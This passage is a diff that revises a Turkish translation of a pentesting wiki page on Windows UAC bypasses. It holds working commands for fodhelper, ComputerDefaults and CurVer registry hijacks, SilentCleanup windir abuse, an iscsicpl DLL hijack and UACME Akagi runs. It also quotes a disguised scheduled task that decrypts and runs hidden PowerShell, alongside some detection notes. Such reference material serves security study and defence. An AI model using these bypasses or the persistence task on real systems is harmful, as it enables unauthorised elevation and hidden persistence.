 
-Otomatik yükseltilen COM nesneleri, modern build'lerde pratik bir UAC saldırı yüzeyi olmaya devam ediyor. `ICMLuaUtil`, UACME tarafından güncel Windows dallarında hâlâ çalıştığı doğrulanan bir yöntem olarak takip ediliyor ve saldırı araçları, COM Elevation Moniker'ı çağırmadan önce etkileşimli bir masaüstü process'i, 64-bit çalıştırma ve bazen PEB/process masquerading'i birleştirerek `CMSTPLUA`'yı uyarlamaya devam ediyor.<sup>[[3]](#references)</sup>
+Otomatik yükseltilen COM nesneleri, modern sürümlerde hâlâ kullanışlı bir UAC saldırı yüzeyidir. `ICMLuaUtil`, UACME'de güncel Windows sürümlerinde çalıştığı belirtilen yöntemler arasında yer alıyor. Saldırı araçları da COM Elevation Moniker'ı çağırmadan önce etkileşimli bir masaüstü süreci ve 64 bit yürütme kullanıp bazen PEB/süreç taklidi yaparak `CMSTPLUA` yöntemini geliştirmeye devam ediyor.<sup>[[3]](#references)</sup>
 
-Pratik ipuçları:
-- Kullanıcının **interactive session**'ındaki (genellikle `explorer.exe` veya onun bir child process'i) **64-bit** bir process'i tercih edin.
-- Ham bir shell başarısız olursa, naif bir `CreateProcess` wrapper'ı yerine bir BOF / UACME implementasyonundan yeniden deneyin.
-- Child execution'ın **ayrı bir elevated process** içinde gerçekleşmesini bekleyin; birçok BOF mevcut beacon'ı yerinde yükseltmez.
+Uygulamaya yönelik ipuçları:
+- Kullanıcının **etkileşimli oturumunda** çalışan bir **64 bit** süreci tercih edin (genellikle `explorer.exe` veya onun alt süreci).
+- Ham bir shell başarısız olursa, basit bir `CreateProcess` sarmalayıcısı yerine BOF / UACME uygulamasından yeniden deneyin.
+- Alt sürecin **ayrı bir yükseltilmiş süreçte** çalışmasını bekleyin; birçok BOF mevcut beacon'ı yerinde yükseltmez.
 
 ### KRBUACBypass
 
-Dokümantasyon ve tool: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) adresinde dokümantasyon ve araç bulunur.
 
 ### UAC bypass exploit'leri
 
-[**UACME**](https://github.com/hfiref0x/UACME), UAC bypass tekniklerinden oluşan bir koleksiyondur. Visual Studio veya MSBuild ile derleyin; derleme birkaç executable oluşturur (örneğin, `Source\Akagi\output\x64\Debug\Akagi.exe`), bu nedenle hedef build'e uygun yöntemi seçin.<sup>[[3]](#references)</sup>\
-Dikkatli olun: bazı bypass'lar kullanıcıyı uyarabilecek görünür programlar veya prompt'lar başlatır.<sup>[[3]](#references)</sup>
+[**UACME**](https://github.com/hfiref0x/UACME), UAC bypass tekniklerinden oluşan bir koleksiyondur. Visual Studio veya MSBuild ile derleyin; derleme birkaç yürütülebilir dosya oluşturur (örneğin, `Source\Akagi\output\x64\Debug\Akagi.exe`). Bu nedenle hedef build'e uygun yöntemi seçin.<sup>[[3]](#references)</sup>\
+Dikkatli olun: bazı bypass yöntemleri, kullanıcıyı uyarabilecek görünür programlar veya istemler başlatır.<sup>[[3]](#references)</sup>
 
-UACME, her tekniğin çalışmaya başladığı **build version** bilgisini içerir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
+UACME'de her tekniğin çalışmaya başladığı **build sürümü** belirtilir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
+
 ```powershell
 PS C:\> [environment]::OSVersion.Version
 
@@ -189,42 +200,49 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Ayrıca [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak yapı sürümlerinden Windows sürümü olan `1607` değerini elde edebilirsiniz.
 
-Pratik bir iş akışı, önce **host build'ini değerlendirmek**, ardından eşleşen yöntemi çalıştırmaktır:
+Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak build sürümlerinden Windows sürümü `1607`'yi bulabilirsiniz.
+
+Uygulanabilir bir iş akışı, önce **host build'ini puanlamak**, ardından eşleşen yöntemi çalıştırmaktır:
+
 ```cmd
 python main.py --scan uac
 Akagi64.exe 33 C:\Windows\System32\cmd.exe
 ```
-- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızlıca karşılaştırır; bu, geçersiz PoC'leri hızlıca elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
-- `UACME`, bir bypass'ı belirli bir build ile eşleştirmek için hâlâ en iyi public catalogue'dur. Version 3.7.1, 83–85 yöntemlerini ekledi; önceki release ise mevcut yöntemleri **Windows 11 25H2** üzerinde yeniden test etti. Eski bir PoC'nin değişiklik yapılmadan hâlâ geçerli olduğunu varsaymak yerine method table ve release notes'u tekrar kontrol edin.<sup>[[3]](#references)[[9]](#references)</sup>
 
-### Always Notify destekli WNF/UIAccess chain'leri (UACME 3.7.1)
+- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızla karşılaştırır; bu da işe yaramayan PoC'leri hızlıca elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
+- `UACME`, bir bypass'ı belirli bir build ile eşleştirmek için hâlâ en iyi herkese açık katalogdur. 3.7.1 sürümünde 83–85 yöntemleri eklendi; önceki sürümde ise mevcut yöntemler **Windows 11 25H2**'ye karşı yeniden test edildi. Eski bir PoC'nin hâlâ değişiklik yapılmadan geçerli olduğunu varsaymak yerine yöntem tablosunu ve sürüm notlarını yeniden kontrol edin.<sup>[[3]](#references)[[9]](#references)</sup>
 
-`Always Notify`, her UAC bypass'ını ortadan kaldırmaz. UACME 3.7.1, user-controlled environment/protocol state'i elevated scheduled-task veya UIAccess davranışıyla birleştiren üç yeni x64 yöntemi uygular ve bunların tümünü `AlwaysNotify compatible` olarak işaretler:<sup>[[3]](#references)[[9]](#references)</sup>
+### Always Notify destekleyen WNF/UIAccess zincirleri (UACME 3.7.1)
 
-- **83 — UnifiedConsent:** WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`'in elevated `taskhostw.exe`'ye `unifiedconsent.dll` side-load ettirmesi için `SystemRoot`'u yönlendirin. UACME bunu Windows 10 build 19041'den itibaren takip eder.
-- **84 — TabTip:** Aynı environment-variable primitive'ini UIAccess `TabTip.exe` üzerinde kullanın. Bu işlem build'e bağlı olarak `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` veya `rsaenh.dll` yükler; ardından ortaya çıkan high-integrity UIAccess context'inden pivot edin. UACME bunu Windows 8.1 / Server 2016'dan itibaren takip eder.
-- **85 — Narrator:** Per-user `feedback-hub` protocol'ünü hijack edin, `Alt+CapsLock+F` ile Narrator'ı çalıştırın, ardından `OskSupport.dll` side-load eden yazılabilir bir `osk.exe` kopyası başlatın. Bu yöntem etkileşimli bir desktop gerektirir ve Windows 10 1809 / Server 2019'dan itibaren takip edilir.
+`Always Notify`, tüm UAC bypass'larını ortadan kaldırmaz. UACME 3.7.1, kullanıcı denetimindeki ortam/protokol durumunu yükseltilmiş zamanlanmış görev veya UIAccess davranışıyla birleştiren üç yeni x64 yöntemi uygular ve bunların tümünü `AlwaysNotify compatible` olarak işaretler:<sup>[[3]](#references)[[9]](#references)</sup>
 
-Payload units ve Akagi'yi UACME'de belgelendiği şekilde build ettikten sonra, eşleşen method number'ı çağırın (optional command varsayılan olarak `cmd.exe`'dir):
+- **83 — UnifiedConsent:** WNF tetiklemeli `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` görevinde yükseltilmiş `taskhostw.exe`'nin `unifiedconsent.dll` dosyasını side-load etmesini sağlamak için `SystemRoot` değerini yönlendirin. UACME, bu yöntemi Windows 10 build 19041'den itibaren izler.
+- **84 — TabTip:** Aynı ortam değişkeni primitive'ini UIAccess `TabTip.exe` üzerinde kullanın. Bu program, build'e bağlı olarak `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` veya `rsaenh.dll` dosyalarını yükler; ardından ortaya çıkan yüksek bütünlük seviyeli UIAccess bağlamından pivot yapın. UACME, bu yöntemi Windows 8.1 / Server 2016'dan itibaren izler.
+- **85 — Narrator:** Kullanıcı başına `feedback-hub` protokolünü ele geçirin, Narrator'ı `Alt+CapsLock+F` ile çalıştırın, ardından `OskSupport.dll` dosyasını side-load eden yazılabilir bir `osk.exe` kopyası başlatın. Bunun için etkileşimli bir masaüstü gerekir. UACME, bu yöntemi Windows 10 1809 / Server 2019'dan itibaren izler.
+
+Payload birimlerini ve Akagi'yi UACME'de belgelendiği şekilde derledikten sonra eşleşen yöntem numarasını kullanın (isteğe bağlı komut varsayılan olarak `cmd.exe` olur):
+
 ```cmd
 Akagi64.exe 83 C:\Windows\System32\cmd.exe
 Akagi64.exe 84 C:\Windows\System32\cmd.exe
 Akagi64.exe 85 C:\Windows\System32\cmd.exe
 ```
-Yöntem 84 ve 85, UIAccess/desktop interaction'a bağlıdır; bu nedenle Session 0'dan veya etkileşimli olmayan bir service shell'den değiştirilmeden çalışacaklarını beklemeyin. Üçü de environment/protocol state'i manipüle eder ve DLL'leri stage eder; implementation'ı inceleyin ve testten sonra bu artifact'leri kaldırın.<sup>[[3]](#references)[[9]](#references)</sup>
+
+Methods 84 ve 85, UIAccess/masaüstü etkileşimine bağlıdır; bu nedenle Session 0'dan veya etkileşimsiz bir hizmet kabuğundan çalıştırıldıklarında değişiklik yapmadan çalışacaklarını varsaymayın. Üçü de ortam/protokol durumunu değiştirir ve DLL'leri hazırlar; uygulamayı inceleyin ve test ettikten sonra bu kalıntıları kaldırın.<sup>[[3]](#references)[[9]](#references)</sup>
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
-Güvenilen binary `fodhelper.exe`, modern Windows'ta auto-elevated'dır. Başlatıldığında, aşağıdaki per-user Registry path'ini `DelegateExecute` verb'ünü doğrulamadan sorgular. Buraya bir command yerleştirmek, Administrators grubunda bulunan bir kullanıcının Medium Integrity process'inin UAC prompt'u olmadan High Integrity process'i başlatmasına olanak tanır.
+Güvenilir ikili `fodhelper.exe`, modern Windows'ta otomatik olarak yükseltilir. Başlatıldığında, aşağıdaki kullanıcı başına registry yolunu `DelegateExecute` verb'ünü doğrulamadan sorgular. Buraya bir komut yerleştirmek, Administrators grubunda olan bir kullanıcının Medium Integrity düzeyindeki bir işlemin UAC istemi olmadan High Integrity düzeyinde bir işlem başlatmasını sağlar.
 
-fodhelper tarafından sorgulanan Registry path'i:
+fodhelper tarafından sorgulanan registry yolu:
 ```text
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
+
 <details>
 <summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>
+
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
 C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
@@ -243,15 +261,21 @@ Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
 # 4) (Recommended) Cleanup
 Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
 ```
+
 </details>
-Notes:
-- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/gevşek olduğunda çalışır (ek kısıtlamalar içeren Always Notify durumunda çalışmaz).
-- 64-bit Windows üzerinde 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` path'ini kullanın.
-- Payload herhangi bir command olabilir (PowerShell, cmd veya bir EXE path'i). Gizlilik için kullanıcı arayüzü istemlerinden kaçının.
+Notlar:
+- Geçerli kullanıcı Administrators grubunun üyesiyse ve UAC düzeyi varsayılan/esnek ayardaysa çalışır (ek kısıtlamalarla birlikte Always Notify değil).
+- 64 bit Windows'ta 32 bit bir süreçten 64 bit PowerShell başlatmak için `sysnative` yolunu kullanın.
+- Payload herhangi bir komut olabilir (PowerShell, cmd veya bir EXE yolu). Gizlilik için kullanıcıya istem gösteren arayüzlerden kaçının.
 
-#### CurVer/extension hijack variant (HKCU only)
+#### Aynı `ms-settings` handler'ı için `ComputerDefaults.exe` trigger'ı
 
-Recent samples abusing `fodhelper.exe`, `DelegateExecute` kullanmaktan kaçınır ve bunun yerine per-user `CurVer` value üzerinden **`ms-settings` ProgID'sini redirect eder**. Auto-elevated binary, handler'ı hâlâ `HKCU` altında resolve ettiğinden, key'leri yerleştirmek için admin token gerekmez:<sup>[[5]](#references)</sup>
+`ComputerDefaults.exe`, `fodhelper.exe` ile aynı kullanıcıya özel `ms-settings\Shell\Open\command` ilişkilendirmesini çözümler.<sup>[[13]](#references)[[14]](#references)</sup> Varsayılan komutu ve yukarıdaki boş `DelegateExecute` değerini ayarladıktan sonra, alternatif bir trigger olarak `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` kullanın; kayıt defteri kurulumunu tekrarlamayın.<sup>[[13]](#references)[[14]](#references)</sup> Yukarıdaki `fodhelper.exe` notlarında belirtilen orta bütünlük düzeyindeki yönetici ve UAC ilkesi ön koşulları burada da geçerlidir.<sup>[[2]](#references)[[3]](#references)</sup> UACME, bu trigger'ı Windows 10 RS4 (build 17134) sürümünden itibaren listeliyor; bu nedenle hedef build'de doğrulayın.<sup>[[3]](#references)</sup>
+
+#### CurVer/uzantı hijack varyantı (yalnızca HKCU)
+
+`fodhelper.exe`'yi kötüye kullanan güncel örnekler `DelegateExecute` kullanmaktan kaçınıyor ve bunun yerine kullanıcıya özel `CurVer` değeri üzerinden **`ms-settings` ProgID'sini yönlendiriyor**. Auto-elevated binary, handler'ı hâlâ `HKCU` altında çözümler; bu nedenle anahtarları oluşturmak için admin token gerekmez:<sup>[[5]](#references)</sup>
+
 ```powershell
 # Point ms-settings to a custom extension (.thm) and map that extension to our payload
 New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
@@ -260,103 +284,110 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Valu
 
 Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
 ```
-Yetki yükseltildikten sonra malware genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**, ardından ek savunma atlatma işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve yüksek bütünlük düzeyinde çalışmak üzere persistence mekanizmasını yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR ile şifrelenmiş bir PowerShell scripti** saklar ve bunu her saat bellekte çözüp çalıştırır:<sup>[[5]](#references)</sup>
+
+Yetki yükseltildikten sonra malware, genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` yaparak **gelecekteki istemleri devre dışı bırakır**, ardından ek defense evasion adımları uygular (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve yüksek bütünlük düzeyinde çalışması için persistence mekanizmasını yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR ile şifrelenmiş bir PowerShell scripti** saklar ve her saat bellekte çözüp çalıştırır:<sup>[[5]](#references)</sup>
+
 ```powershell
 schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
 ```
-Bu varyant da dropper'ı temizler ve yalnızca staged payload'ları bırakır; bu nedenle detection, **`CurVer` hijack**'inin, `ConsentPromptBehaviorAdmin` üzerinde yapılan tampering'in, Defender exclusion oluşturulmasının veya PowerShell'i bellekte decrypt eden scheduled task'ların izlenmesine dayanır.<sup>[[5]](#references)</sup>
 
-### `SilentCleanup` task üzerinden UAC bypass (`HKCU\Environment\windir`)
+Bu varyant dropper'ı yine temizleyip yalnızca staged payloads'ları bırakır; bu nedenle tespit, **`CurVer` hijack**'inin, `ConsentPromptBehaviorAdmin` kurcalamasının, Defender exclusion oluşturulmasının veya PowerShell'i bellekte çözen zamanlanmış görevlerin izlenmesine bağlıdır.<sup>[[5]](#references)</sup>
 
-`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcı ortamından genişletir. `HKCU\Environment\windir` değerini kontrol ediyorsanız, bu genişletmeyi arbitrary bir komuta yönlendirebilir ve consent dialog olmadan high integrity elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME tekniği aktif tutmaya devam ettiğinden ve güncel issue tracking, Windows 11 24H2'nin yalnızca küçük quoting ayarlamaları gerektirebileceğini gösterdiğinden, bu yöntem recent build'lerde hâlâ test edilmeye değerdir.<sup>[[3]](#references)</sup>
+### `SilentCleanup` görevi üzerinden UAC bypass (`HKCU\Environment\windir`)
+
+`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcı ortamından genişletir. `HKCU\Environment\windir` değerini kontrol edebiliyorsanız, bu genişletmeyi keyfi bir komuta yönlendirip onay iletişim kutusu olmadan yüksek bütünlük düzeyi elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME bu tekniği etkin tuttuğundan ve son sorun kayıtları Windows 11 24H2'de yalnızca küçük tırnaklama ayarlamalarının gerekebileceğini gösterdiğinden, bu yöntemi güncel derlemelerde test etmeye hâlâ değer.<sup>[[3]](#references)</sup>
+
 ```cmd
 reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
 schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 reg delete "HKCU\Environment" /v windir /f
 ```
-Bu build üzerinde görev yolu tırnak içine alıyorsa, payload'ı tırnakla bitirerek yeniden deneyin (örneğin `cmd.exe"`). Testten sonra `HKCU\Environment\windir` değerini her zaman temizleyin.
+
+Bu derlemede görev yolu tırnak içine alıyorsa, sonunda tırnak bulunan bir payload ile yeniden deneyin (örneğin `cmd.exe"`). Testten sonra `HKCU\Environment\windir` değerini her zaman temizleyin.
 
 #### Daha fazla UAC bypass
 
-UI akışlarını, COM nesnelerini veya masaüstü etkileşimini kötüye kullanan birçok klasik UAC bypass yöntemi, kurbanla **tam etkileşimli bir oturum** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0** içinde çalışan bir service çoğu zaman yeterli değildir.
+UI akışlarını, COM nesnelerini veya masaüstü etkileşimini kullanan birçok klasik UAC bypass, kurbanla **tam etkileşimli bir oturum** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0**'da çalışan bir hizmet çoğu zaman yeterli olmaz.
 
-Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değerinin **1** olduğu bir **process**'e migrate edin:
+Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değeri **1** olan bir **process**'e geçiş yapın:
 
-![Özel bir extension (.thm) için ms-settings'i yönlendirin ve bu extension'ı payload'ınıza eşleyin - Daha fazla UAC bypass: Bir meterpreter oturumu kullanarak bunu elde edebilirsiniz. Session... değerinin olduğu bir process'e migrate edin...](<../../images/image (863).png>)
+![ms-settings'i özel bir uzantıya (.thm) yönlendirin ve bu uzantıyı payload'ımıza eşleyin - Daha fazla UAC bypass: Bir meterpreter oturumu kullanarak bunu elde edebilirsiniz. Session değeri... olan bir process'e geçiş yapın...](<../../images/image (863).png>)
 
-(_explorer.exe_ çalışmalıdır)
+(_explorer.exe_ çalışmalı)
 
 ### GUI ile UAC Bypass
 
-Bir **GUI** erişiminiz varsa, UAC istemi göründüğünde **kabul edebilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle bir GUI oturumu elde etmek, UAC'nin eklediği pratik engeli aşmak için çoğu zaman yeterlidir.
+Bir **GUI'ye erişiminiz varsa, UAC istemi göründüğünde kabul edebilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle, bir GUI oturumu edinmek çoğu zaman UAC'nin yarattığı pratik engeli aşmak için yeterlidir.
 
-Ayrıca, birinin kullanmakta olduğu bir GUI oturumu elde ederseniz (muhtemelen RDP üzerinden), **administrator olarak çalışan bazı araçlar** bulunabilir. Buradan, örneğin bir **cmd**'yi doğrudan **admin olarak çalıştırabilirsiniz**; [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi araçlarda UAC tarafından tekrar prompt gösterilmez. Bu biraz daha **stealthy** olabilir.
+Ayrıca, birinin kullandığı bir GUI oturumu edinirseniz (potansiyel olarak RDP üzerinden), **yönetici olarak çalışan bazı araçlar** bulunabilir; bu araçlar üzerinden, [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi, UAC yeniden istemde bulunmadan doğrudan **yönetici olarak** bir **cmd** çalıştırabilirsiniz. Bu biraz daha **stealthy** olabilir.
 
 ### Gürültülü brute-force UAC bypass
 
-Gürültü kabul edilebilirse, [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir araç, kullanıcı kabul edene kadar tekrar tekrar elevation isteğinde bulunabilir.
+Gürültü sorun değilse, [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir araç, kullanıcı kabul edene kadar yükseltme isteğini tekrarlayabilir.
 
 ### Kendi bypass'ınız - Temel UAC bypass metodolojisi
 
-**UACME**'ye göz atarsanız, **birçok UAC bypass yönteminin DLL hijacking'i kötüye kullandığını** fark edersiniz (çoğunlukla elevated bir binary'ye, yazılabilir bir path'ten saldırgan kontrolündeki bir DLL yükleterek). [DLL hijacking zafiyetini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).
+**UACME**'ye bakarsanız, birçok UAC bypass'ın **DLL hijacking** kullandığını fark edeceksiniz (genellikle yükseltilmiş bir binary'ye, saldırganın kontrolündeki bir DLL'yi yazılabilir bir konumdan yükleterek). [DLL hijacking güvenlik açığını nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level'da çalıştığını kontrol edin).
-2. Procmon ile **DLL Hijacking** için zafiyetli olabilecek "**NAME NOT FOUND**" event'lerini bulun.
-3. DLL'i bazı **protected path'lerin** (C:\Windows\System32 gibi) içine **yazmanız** gerekecektir; burada yazma izniniz yoktur. Bunu şu yöntemlerle aşabilirsiniz:
-1. **wusa.exe**: Windows 7,8 ve 8.1. Bu araç high integrity level'dan çalıştırıldığı için bir CAB dosyasının içeriğini protected path'lerin içine çıkarmanıza izin verir.
-2. **IFileOperation**: Windows 10.
-4. DLL'inizi protected path'in içine kopyalayacak ve zafiyetli, autoelevated binary'yi çalıştıracak bir **script** hazırlayın.
+1. **Aut​​oelevate** olacak bir binary bulun (çalıştırıldığında yüksek integrity level'da çalıştığını kontrol edin).
+2. Procmon ile **DLL Hijacking** için güvenlik açığı oluşturabilecek "**NAME NOT FOUND**" olaylarını bulun.
+3. DLL'yi muhtemelen yazma izniniz olmayan bazı **korumalı yolların** (C:\Windows\System32 gibi) içine **yazmanız** gerekecek. Bunu şu yöntemlerle aşabilirsiniz:
+   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç, yüksek integrity level'da çalıştığı için bir CAB dosyasının içeriğini korumalı yollara çıkartabilir.
+   2. **IFileOperation**: Windows 10.
+4. DLL'nizi korumalı yola kopyalayan ve güvenlik açığı bulunan, autoelevated binary'yi çalıştıran bir **script** hazırlayın.
 
 ### Başka bir UAC bypass tekniği
 
-Bir **autoElevated binary**'nin çalıştırılacak bir **binary** veya **command**'in **name/path** bilgisini **registry**'den **okumaya** çalışıp çalışmadığını izlemekten oluşur (binary bu bilgiyi **HKCU** içinde arıyorsa daha ilginçtir).
+Bu yöntem, **autoElevated binary**'nin çalıştırılacak bir **binary**'nin veya **komutun** **adını/yolunu** **registry**'den **okumaya** çalışıp çalışmadığını izlemeyi içerir (binary bu bilgiyi **HKCU** içinden arıyorsa yöntem daha ilgi çekicidir).
 
-### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijacking ile UAC bypass
+### `SysWOW64\iscsicpl.exe` ve kullanıcı `PATH`'i üzerinden DLL hijacking ile UAC bypass
 
-32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, search order kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilen **auto-elevated** bir binary'dir. Kötü amaçlı bir `iscsiexe.dll` dosyasını **user-writable** bir klasöre yerleştirebilir ve ardından mevcut user `PATH` değerini (örneğin `HKCU\Environment\Path` üzerinden) bu klasörün aranmasını sağlayacak şekilde değiştirebilirseniz, Windows saldırganın DLL'ini elevated `iscsicpl.exe` process'i içinde **UAC prompt göstermeden** yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>
+32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, arama sırasını kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilecek, **auto-elevated** bir binary'dir. Kötü amaçlı bir `iscsiexe.dll` dosyasını **kullanıcının yazabildiği** bir klasöre koyabilir ve ardından geçerli kullanıcının `PATH` değerini (örneğin `HKCU\Environment\Path` üzerinden) değiştirerek bu klasörün aranmasını sağlayabilirseniz, Windows saldırganın DLL'sini yükseltilmiş `iscsicpl.exe` process'i içinde **UAC istemi göstermeden** yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>
 
-Pratik notlar:
-- Bu, mevcut user **Administrators** grubundaysa ancak UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa kullanışlıdır.
-- Bu bypass için **SysWOW64** kopyası önemlidir. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışını bağımsız olarak doğrulayın.
-- Primitive, **auto-elevation** ile **DLL search-order hijacking** birleşimidir; bu nedenle diğer UAC bypass yöntemleri için kullanılan aynı ProcMon workflow'u eksik DLL yüklemesini doğrulamak için yararlıdır.
+Uygulamaya yönelik notlar:
+- Bu yöntem, geçerli kullanıcı **Administrators** grubunda olmasına rağmen UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa kullanışlıdır.
+- Bu bypass için ilgili olan **SysWOW64** kopyasıdır. **System32** kopyasını ayrı bir binary olarak ele alın ve davranışını bağımsız olarak doğrulayın.
+- Bu yöntem **auto-elevation** ile **DLL search-order hijacking**'in birleşimidir. Bu nedenle, diğer UAC bypass'larında kullanılan ProcMon iş akışı eksik DLL yüklemesini doğrulamak için işe yarar.
 
-Minimal akış:
+En temel akış:
+
 ```cmd
 copy iscsiexe.dll %TEMP%\iscsiexe.dll
 reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
 C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
 ```
-Tespit fikirleri:
-- `reg add` / `HKCU\Environment\Path` konumuna registry yazma işlemlerinin hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasını uyarı olarak işaretleyin.
-- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı tarafından kontrol edilen** konumlarda `iscsiexe.dll` dosyasını arayın.
-- `iscsicpl.exe` başlatmalarını, beklenmeyen child process'ler veya normal Windows dizinleri dışından yapılan DLL yüklemeleriyle ilişkilendirin.
 
-### Ayrı olarak incelenmeye değer daha yeni araştırmalar
+Algılama fikirleri:
+- `reg add` / kayıt defteri yazma işlemlerinin hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasına yönelik uyarı oluşturun.
+- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı denetimindeki** konumlarda `iscsiexe.dll` arayın.
+- `iscsicpl.exe` başlatmalarını beklenmeyen alt süreçlerle veya normal Windows dizinlerinin dışından yapılan DLL yüklemeleriyle ilişkilendirin.
 
-2024 sonrası bazı zincirler artık klasik `HKCU\Software\Classes` registry hijack'lerine benzemiyor. Örneğin activation-context cache poisoning, **drive remap** ve **DLL redirection** işlemlerini zincirleyerek `ctfmon.exe` ve daha sonra `fodhelper.exe` gibi güvenilir UI / auto-elevated binary'ler üzerinden medium integrity'den high integrity'ye geçiş sağlayabilir. Büyük PoC'yi burada tekrarlamak yerine aşağıdaki konumdaki kompakt payload örneklerini inceleyin:
+### Ayrı olarak incelenmeye değer yeni araştırmalar
+
+2024 sonrası bazı zincirler artık klasik `HKCU\Software\Classes` kayıt defteri ele geçirmelerine benzemiyor. Örneğin, etkinleştirme bağlamı önbelleği zehirlemesi; `ctfmon.exe` gibi güvenilir UI / otomatik yükseltilen ikili dosyalar ve daha sonra `fodhelper.exe` gibi hedefler aracılığıyla bütünlük düzeyini orta seviyeden yükseğe çıkarmak için **sürücü eşlemesini değiştirme** ve **DLL yönlendirme** tekniklerini zincirleyebilir. Büyük PoC'yi burada yinelemek yerine şu konumdaki kısa payload örneklerini inceleyin:
 
 {{#ref}}
 ../windows-local-privilege-escalation/windows-c-payloads.md
 {{#endref}}
 
-### Per-logon-session DOS device map üzerinden Administrator Protection (preview) drive-letter hijack
+### Oturum başına DOS aygıt eşlemesi üzerinden Administrator Protection (önizleme) sürücü harfi ele geçirme
 
 > [!NOTE]
